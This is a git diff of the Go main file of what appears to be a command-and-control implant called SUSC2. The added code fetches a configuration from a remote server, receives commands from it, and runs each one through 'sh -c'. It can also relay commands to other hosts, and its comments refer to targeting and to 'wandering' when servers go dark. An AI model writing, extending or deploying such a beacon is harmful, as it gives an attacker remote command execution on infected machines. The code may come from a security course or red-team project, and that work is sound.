@@ -3,50 +3,84 @@
 package main
 
 import (
-	"bufio"
 	"encoding/json"
 	"fmt"
+	"io"
 	"net/http"
 	"os"
-	"strconv"
-	"strings"
+	"os/exec"
+	"sync"
 
-	"github.com/google/uuid"
+	"github.com/TheRealChrisM/SUSC2/pkg/interop"
+	"github.com/TheRealChrisM/SUSC2/pkg/skserver"
 )
 
-type config struct {
-	identifier uuid.UUID
-	beaconTime int
-	serverList []string
+var config interop.Config
+var mu sync.RWMutex
+var runStream = make(chan string)
+
+func getConfig(server string) (interop.Config, error) {
+	resp, err := http.Get(server + "/setup")
+	if err != nil {
+		return interop.Config{}, err
+	}
+	b, err := io.ReadAll(resp.Body)
+	if err != nil {
+		return interop.Config{}, err
+	}
+	var conf interop.Config
+	err = json.Unmarshal(b, &conf)
+	if err != nil {
+		return interop.Config{}, err
+	}
+	return conf, nil
 }
 
-func get_config(address string, port uint16) *json.Decoder {
-	s := fmt.Sprintf("http://%s:%d", address, port)
-	resp, err := http.Get(s)
-	if err != nil {
-		panic(err)
+func run() { // TODO add targeting logic?
+	for c := range runStream {
+		exec.Command("sh", "-c", c).Start()
 	}
-	defer resp.Body.Close()
-	scanner := bufio.NewScanner(resp.Body)
-	raw_config := ""
-	for scanner.Scan() {
-		//i := 0; scanner.Scan(); i++ {
-		raw_config += scanner.Text()
-	}
-	config := json.NewDecoder(strings.NewReader(raw_config))
-	fmt.Print(config)
-	return config
+}
+
+func scan() { // remember to Lock() when updating the config
+	// TODO scan for new servers
 }
 
 func main() {
 	//Attempt to gather config from Skeld server.
 	var address string = os.Args[1]
-	port, err := strconv.ParseInt(os.Args[2], 10, 16)
+
+	relay := false
+
+	config, err := getConfig(address)
 	if err != nil {
-		panic(err) // idfk man i wanna go sleep, true
+		panic(err)
+	}
+	fmt.Print(config)
+	pullStream := make(chan string)
+	pushStream := make(chan string)
+
+	go run()
+	go skserver.Fetch(&config, &mu, &pullStream)
+	go scan()
+
+	go func() {
+		for c := range pullStream {
+			runStream <- c
+			pushStream <- c
+		}
+	}()
+
+	if relay {
+		go skserver.Serve(&pushStream)
+	} else {
+		go func() {
+			for range pushStream {
+
+			}
+		}()
 	}
 
-	config := get_config(address, uint16(port))
 	//Poll Skeld servers to make sure MIN(num_servers, 3) are known and functional.
 
 	//If there are no working Skeld servers left, start wandering...
@@ -55,7 +89,7 @@ func main() {
 
 	//Get the tasks from the server, loop through them, and execute.
 
-	//Maybe buffer the
+	//Maybe buffer everything before sending?
 
 	//eppy boi
 }
